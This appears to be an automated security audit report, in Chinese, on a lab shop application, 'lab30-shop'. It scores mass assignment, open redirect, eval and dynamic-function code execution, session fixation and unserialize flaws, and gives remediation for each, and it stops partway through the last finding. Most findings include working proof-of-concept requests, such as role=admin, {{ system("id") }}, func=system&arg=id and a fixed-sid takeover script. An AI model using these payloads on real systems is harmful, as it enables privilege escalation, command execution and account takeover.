# 宿主阶段审计报告

运行：`db35a73a71c34f5f9ebd6462a6f0856e`
状态：inconclusive；完整性：未完成
停止原因：收束条件未满足，仍存在受阻方向或缺少有效动态验证。

运行发现原始记录：70；当前有效记录：62；按台账身份分组：46

## 当前有效发现

### 台账 `0fee004aaf334840989e82b5a3a2a1f0`

- account/update.php 批量赋值允许篡改 role/balance/tier 权限与资产字段（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `b71d71fbe5b94a0c90e3d66a64d5168d` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：update.php 的 $columns 白名单包含 role、balance、tier，脚本把任意匹配的 POST 键值拼入 UPDATE users SET ... WHERE id=?。虽然 WHERE 固定为当前会话用户 id，排除了 IDOR，但攻击者可修改自己的 role/balance/tier 实现越权与资产篡改，属批量赋值。
  输入：POST 参数 role、balance、tier 等
  传播：$_POST 键名经 in_array 命中 columns，values 拼接后进入 UPDATE users
  危险操作：UPDATE users SET role/balance/tier 修改权限与资产
  保护：WHERE id=$u['id'] 阻止改他人，但字段白名单过宽；check_csrf 存在但无法阻止合法用户自改特权字段
  前提：['攻击者持有效登录会话与 CSRF token']
  修复建议：仅允许 display_name、nickname、email、homepage 等无特权字段，服务端不接收 role/balance/tier。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:33:23.966926+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 公开 Web 入口 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需提交额外 POST 字段 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录普通用户 | lab30-shop/app/public/account/update.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用身份模型内 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取并提升为管理员角色影响数据 | lab30-shop/app/src/bootstrap.php:35-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可写 role/balance/tier | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未证直接拒绝服务 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'update_mass_assignment.php', 'language': 'php', 'script': '<?php\n// 在已登录环境用浏览器或 curl 提交\n// POST /account/update.php\n// csrf=<token>&display_name=x&role=admin&balance=999999&tier=gold\n', 'instructions': '登录普通账号，获取 update 页面 csrf 值，向 /account/update.php 提交 POST，附额外 role=admin、balance=999999。', 'normal_input': 'csrf=<token>&display_name=test', 'attack_input': 'csrf=<token>&display_name=test&role=admin&balance=999999&tier=gold', 'expected_result': '控制请求返回后 /account/me.php 显示 role=admin、balance=999999、tier=gold。'}
````

- account/update.php 列白名单包含 role/balance/tier，$_POST 整体写入导致普通用户批量赋值提权与篡改余额（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：verified）
  来源 `2acda910c91344428a113b942671b753` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/update.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：第4行 $columns 白名单显式包含 role、balance、tier；第5行遍历 $_POST，凡命中白名单即拼入 SET 子句与参数值；第6行执行 UPDATE users SET ... WHERE id=$u['id']，$u 为当前登录用户。页面表单仅渲染 display_name/nickname/email/homepage，但服务端按攻击者提交的任意白名单字段写入，因此普通用户可在同一请求中覆盖自己的 role 为 admin、篡改 balance 或提升 tier，属批量赋值。check_csrf 存在但不构成字段级授权。
  输入：$_POST 中任意键名；攻击者提交 role=admin&balance=999999&tier=gold
  传播：foreach $_POST -> in_array($key,$columns,true) -> $set[]='`role`=?' -> UPDATE users SET ... WHERE id=$u['id']
  危险操作：db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values) 写入 role/balance/tier
  保护：仅 check_csrf() 与会话校验；无字段级授权或对敏感列过滤，白名单本身就含敏感列
  前提：['攻击者持有效登录会话与 CSRF token（注册即可获得）']
  修复建议：白名单移除 role/balance/tier 等特权与资产字段；显式映射仅允许用户自助修改的字段并按当前用户 id 更新；角色与资产变更走独立授权流程。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:54:48.338593+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 表单访问远程账户功能 | lab30-shop/app/public/account/update.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需提交表单未展示的 role/balance/tier 字段 | lab30-shop/app/public/account/update.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需任意有效登录会话与页面 csrf token，注册即得 | lab30-shop/app/src/bootstrap.php:33-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者对自己的会话操作，无需他人参与 | lab30-shop/app/public/account/update.php:2-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同应用同用户记录内提升权限 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未证明读取他人数据 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可改写自身 role/balance/tier，直接影响权限与资产 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未证明可用性影响 | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'mass_assign_update.php', 'language': 'php', 'script': '<?php\n// 1) 登录取得会话与 csrf token 后，向 /account/update.php 提交敏感字段\n// 使用 curl 保存 cookie 并从更新页面抓取 csrf\n$ch = curl_init(\'http://TARGET/account/update.php\');\ncurl_setopt_array($ch,[CURLOPT_COOKIEJAR=>\'c.txt\',CURLOPT_COOKIEFILE=>\'c.txt\',CURLOPT_RETURNTRANSFER=>true]);\n$html = curl_exec($ch);\npreg_match(\'/name="csrf" value="([^"]+)"/\',$html,$m);\n$csrf=$m[1]??\'\';\n$post=http_build_query([\'csrf\'=>$csrf,\'display_name\'=>\'x\',\'role\'=>\'admin\',\'balance\'=>\'999999\',\'tier\'=>\'gold\']);\ncurl_setopt_array($ch,[CURLOPT_URL=>\'http://TARGET/account/update.php\',CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$post,CURLOPT_HTTPHEADER=>[\'Accept: application/json\']]);\necho curl_exec($ch);\n', 'instructions': '先登录获取会话（注册或登录），将脚本中的 TARGET 替换为目标主机名，运行后检查返回 JSON 中 role/balance/tier 是否变为攻击值。', 'normal_input': 'csrf=<token>&display_name=Alice&email=a@example.com', 'attack_input': 'csrf=<token>&display_name=x&role=admin&balance=999999&tier=gold', 'expected_result': '攻击请求返回的成员对象 role=admin、balance=999999、tier=gold；正常输入仅改显示名与邮箱。'}
````


### 台账 `cbd892ab3fe54dc3b6c3995b95d0567e`

- account/profile.php 未校验 url 导致开放重定向与链接属性注入（CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N，验证：verified）
  来源 `6c715290154e41548a57481afbff1822` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：$_GET['url'] 直接作为个人主页链接，无 http(s) 前缀或 host 白名单校验，也不过滤引号/事件属性，导致可输出 https://evil 或注入 onmouseover 等。
  输入：GET url 参数
  传播：$url 未校验进入 href 属性
  危险操作：生成可点击的外部链接/属性注入
  保护：h() 仅转义属性引号可防 HTML 断出，但未校验协议与域名
  前提：['攻击者发送带 url 参数的 profile.php 链接，或用户保存恶意 homepage']
  修复建议：只允许 https?:// 并校验域名，或使用相对路径；对 href 做 URL 白名单过滤。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:33:23.967852+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | GET 公开参数 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 url 参数即可 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需已登录 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击被污染链接 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一边界 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未直接影响机密性 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可将用户引导到攻击者站点 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_open_redirect.sh', 'language': 'bash', 'script': "#!/bin/sh\n# 已登录后访问\ncurl -b 'SHOPSESSID=<sid>' 'http://target/account/profile.php?url=https://evil.example/'\n", 'instructions': '登录后请求 URL，检查返回 HTML 中 profile-link 的 href 指向外部域名。', 'normal_input': 'url=/orders/index.php', 'attack_input': 'url=https://evil.example/', 'expected_result': '响应包含 <a id="profile-link" href="https://evil.example/">，点击跳转到攻击者站点。'}
````


### 台账 `bfd1580e14754964a21945d15907d435`

- 运营模板渲染对 POST template 使用 eval() 执行双花括号表达式（代码执行）（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `52159587c9174c789b9aa7c9563553e9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：template-render.php 第2行取 POST template 原样保存，第3行仅做 check_csrf() 校验后用正则抓取 {{...}} 内部文本拼接 eval('return '.$m[1].';')。CSRF 校验只防跨站请求伪造，不限制表达式内容，运营账号即可执行任意 PHP 代码。
  输入：POST 参数 template
  传播：$_POST['template'] -> preg_replace_callback 捕获组 $m[1] -> eval
  危险操作：eval('return '.$m[1].';')
  保护：check_csrf() 仅校验 CSRF token；require_user 仅限 operator/admin 角色；对表达式内容无任何过滤
  前提：['攻击者持有 operator 或 admin 角色账号（注册后是否可提权需另查，但运营账号本身即可）']
  修复建议：移除 eval，改用白名单表达式解析或受限模板引擎

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:33:36.689861+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 运营后台页面经 HTTP 访问 | lab30-shop/app/public/ops/template-render.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接提交 {{ ... }} 表达式即可触发 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user(['operator','admin']) 要求 operator/admin 账号 | lab30-shop/app/public/ops/template-render.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身会话即可触发 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在应用进程内执行 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取任意数据库/文件内容 | lab30-shop/app/src/bootstrap.php:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可写数据库与执行任意 PHP | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无明确破坏证据 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_template_render.py', 'language': 'python', 'script': 'import requests\ns=requests.Session()\ns.get(\'http://target/auth/login.php\')\nr=s.post(\'http://target/auth/login.php\',data={\'username\':\'operator\',\'password\':\'operator\'})\ntok=s.get(\'http://target/ops/template-render.php\').text\nimport re\nm=re.search(r\'name="csrf" value="([^"]+)"\',tok)\ns.post(\'http://target/ops/template-render.php\',data={\'csrf\':m.group(1),\'template\':\'{{ system("id") }}\'})\n', 'instructions': '以 operator 账号登录后向 /ops/template-render.php 提交带 {{ system("id") }} 的 template，脚本会回显命令输出', 'normal_input': 'template={{ 2 + 2 }}', 'attack_input': 'template={{ system("id") }}', 'expected_result': '正常输入只返回 4；攻击输入在页面 <pre> 中返回命令执行结果'}
````

- 运营模板渲染将 POST template 中 {{...}} 内容交给 eval() 执行（模板表达式注入导致代码执行）（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：verified）
  来源 `ec34a575863b4cf6b24e5522cd793693` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/template-render.php', 'start_line': 1, 'end_line': 4}]
  结论：template-render.php:2 从 $_POST['template'] 读取用户输入；:3 对每个 {{...}} 匹配执行 eval('return '.$m[1].';')，表达式内可写入任意 PHP，如 system('id') 或读取文件。该页面仅要求 operator/admin 角色，无对表达式内容的白名单，CSRF 令牌只防跨站伪造，不限制已登录运营者注入代码。
  输入：HTTP POST 参数 template（双花括号内表达式）
  传播：$_POST['template'] -> preg_replace_callback('/\{\{(.*?)\}\}/s') -> $m[1] 拼接进 eval('return '.$m[1].';')
  危险操作：eval() 执行攻击者可控的 PHP 表达式
  保护：require_user(['operator','admin']) 与 check_csrf() 仅限制角色和跨站请求，不校验表达式内容
  前提：['持有 operator 或 admin 角色会话并通过 CSRF 校验']
  修复建议：移除 eval，改用安全的模板引擎或受限表达式解析器，并对模板内容做白名单校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:45:04.681267+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 访问运营页面 | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在双花括号中填写表达式即可命中 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 账号 | lab30-shop/app/public/ops/template-render.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者本人提交表单即可 | lab30-shop/app/public/ops/template-render.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 代码在应用进程内执行 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | eval 内可读取任意应用数据与文件 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意写入与命令 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行破坏性操作 | lab30-shop/app/public/ops/template-render.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `fd7b2de1f92542ed9e05b5d2de82edc1`

- 运营公式计算将 GET func 直接作为函数名调用（任意函数/代码执行）（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：verified）
  来源 `3c7808f9649740629d711017e11d45c2` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/formula.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：formula.php 第3行将 $_GET['func'] 未经白名单直接作为 PHP 函数名调用，参数为 $_GET['arg']。攻击者可传 func=system&arg=id 执行任意系统命令，绕过原本 strtoupper 之类的意图。
  输入：GET 参数 func、arg
  传播：$_GET['func'] -> $func(...) 动态调用
  危险操作：$func($_GET['arg']) 动态函数调用
  保护：仅 require_user(['operator','admin']) 角色校验，无函数白名单
  前提：['operator 或 admin 会话']
  修复建议：改为固定函数白名单映射，禁止任意函数名调用

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:33:36.690881+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 访问 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需 func 参数名称为目标函数 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 会话 | lab30-shop/app/public/ops/formula.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身触发 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同进程执行 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可调用 system/passthru 读取系统信息 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可调用任意写操作函数 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无明确破坏 | lab30-shop/app/public/ops/formula.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_formula.sh', 'language': 'bash', 'script': "curl -b 'SHOPSESSID=<operator cookie>' 'http://target/ops/formula.php?func=system&arg=id'\n", 'instructions': '以 operator 登录取得 cookie 后请求该 URL', 'normal_input': 'func=strtoupper&arg=spring-sale', 'attack_input': 'func=system&arg=id', 'expected_result': '正常输入输出 SPRING-SALE；攻击输入在 <pre> 中输出 id 命令结果'}
````


### 台账 `9e7569a690bc4361acc01bfdc5ee44f9`

- login.php 从 $_GET['sid'] 接受会话 ID 且 use_strict_mode=0，导致会话固定（CVSS 3.1 待评分，验证：inconclusive）
  来源 `74ddec2f3bcd4e01a1c1957d852e9df1` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/login.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 13, 'end_line': 18}, {'path': 'lab30-shop/app/public/auth/login.php', 'start_line': 6, 'end_line': 9}]
  结论：login.php:3 直接以 ($_GET['sid']) 调用 start_session()；bootstrap.php:17 在校验正则通过后调用 session_id($sid)，且 bootstrap.php:13 显式 ini_set('session.use_strict_mode','0') 关闭严格模式，PHP 会接受客户端指定但服务端未初始化过的会话 ID。登录成功时 login.php:8 只是把 $_SESSION['user_id'] 写入该（攻击者已知的）会话，cookie 维持攻击者预置的 ID，攻击者随后用同一 ID 即可继承受害者会话。
  输入：GET 参数 sid=http://target/auth/login.php?sid=<攻击者指定的会话ID>
  传播：login.php:3 → start_session($sid) → bootstrap.php:17 session_id($sid) → bootstrap.php:18 session_start() 使用该 ID → login.php:8 写入 user_id 到该会话
  危险操作：使用外部可控的 session_id 建立认证会话（会话固定）
  保护：bootstrap.php:17 的正则只限制字符集与长度，不防固定；bootstrap.php:13 主动关闭 session.use_strict_mode，导致未初始化的外部 ID 被接受；无登录后 session_regenerate_id
  前提：['攻击者能诱导受害者访问带 sid 参数的登录链接并在同一会话中完成登录；无需预先登录']
  修复建议：移除从请求获取 sid 的入口；开启 session.use_strict_mode=1；登录成功后调用 session_regenerate_id(true)。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:33:50.861563+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 URL 参数在任何网络位置投递 | lab30-shop/app/public/auth/login.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需诱导受害者使用指定 sid 链接登录才有价值 | lab30-shop/app/src/bootstrap.php:13-18 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 固定阶段无需任何权限 | lab30-shop/app/public/auth/login.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 必须有受害者点击并登录 | lab30-shop/app/public/auth/login.php:5-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用授权范围内 | lab30-shop/app/src/bootstrap.php:20-25 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可完整接管受害者账号读取资料 | lab30-shop/app/src/bootstrap.php:23-24 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 接管后可执行账号内写操作（如资料修改） | lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | 待补充 | 未证明对可用性有影响 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'session_fixation_login.py', 'language': 'python', 'script': "import urllib.request\nbase='http://TARGET'\nsid='attackerfixedid1234567890'\n# 1) victim logs in with attacker-supplied sid\nreq=urllib.request.Request(base+'/auth/login.php?sid='+sid, data=b'username=victim&password=Passw0rd!', headers={'Content-Type':'application/x-www-form-urlencoded'})\nurllib.request.urlopen(req)\n# 2) attacker reuses the known session id\nreq2=urllib.request.Request(base+'/account/me.php', headers={'Cookie':'SHOPSESSID='+sid})\nprint(urllib.request.urlopen(req2).read()[:200])\n", 'instructions': '把 TARGET 换成靶场地址、victim 换成测试账号；步骤1模拟受害者在带 sid 的链接上登录，步骤2用同一 sid 直连需登录接口。', 'normal_input': '受害者直接访问 /auth/login.php 登录（无 sid 参数）', 'attack_input': '/auth/login.php?sid=attackerfixedid1234567890', 'expected_result': '带 sid 时攻击者用已知 ID 的 Cookie 即可获得受害者已登录用户信息；对照组无 sid 时该固定 ID 不被接受/无身份。'}
````


### 台账 `5c3db49dc8ce4eeab05208bd9757d432`

- auth/continue.php 对 $_GET['next'] 未校验直接 Location 跳转（开放重定向）（CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N，验证：verified）
  来源 `e5b7fe55ded447c997402215d856d7bf` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/continue.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：continue.php 第3行把 $_GET['next'] 原样拼入 Location 响应头并 exit，没有 scheme/host/相对路径校验。登录用户访问 /auth/continue.php?next=https://evil.example/ 会被 302 到站外；next=javascript:alert(document.domain) 亦会被写入 Location 头，可被用于钓鱼或前端伪协议利用。
  输入：$_GET['next']
  传播：require_user() 通过后第3行读取 $_GET['next'] 直接写入 Location 头
  危险操作：header('Location: '.(string)$_GET['next']) 未校验跳转目标
  保护：仅有 require_user() 认证检查，无跳转目标校验
  前提：['受害者已登录并访问带 next 参数的 continue.php 链接']
  修复建议：对 next 只允许以 / 开头的站内相对路径，拒绝 ://、// 开头及 javascript: 等 scheme。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:34:15.573464+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 链接远程触发 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造带 next 的链接 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需受害者持登录会话 | lab30-shop/app/public/auth/continue.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击链接 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅影响跳转响应 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无数据泄露 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可注入 Location 目标导致钓鱼/伪协议 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `f4e2134dc74647279324e11731a0c484`

- account/backup.php 对用户提交的 backup 直接 unserialize，可篡改 MemberBackup.tier 提升会员等级（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `b07374ed15dd4a98aed4ac61b9bf6fc4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 38, 'end_line': 40}]
  结论：account/backup.php 第4行 base64_decode 用户 POST 的 backup 参数后，第5行直接 unserialize($raw)，仅用 instanceof MemberBackup 校验。src/backup.php 中 MemberBackup 只有两个 public 属性 tier 与 displayName，因此攻击者可自构造序列化负载，把 tier 设为 'gold'，第6行将 $restored->tier/$restored->displayName 写入 users 表，实现会员等级/权益越权提升。
  输入：POST 参数 backup（base64 编码的序列化字符串），来自 account/backup.php 恢复表单
  传播：base64_decode($_POST['backup']) -> unserialize() -> $restored->tier/$restored->displayName -> UPDATE users SET tier=?,display_name=? WHERE id=?（仅限本人 id，但 tier 直接影响会员权益，account/index.php 依据 tier 展示 gold 权益）
  危险操作：unserialize() 反序列化外部可控数据，并将反序列化出的属性写入 users.tier
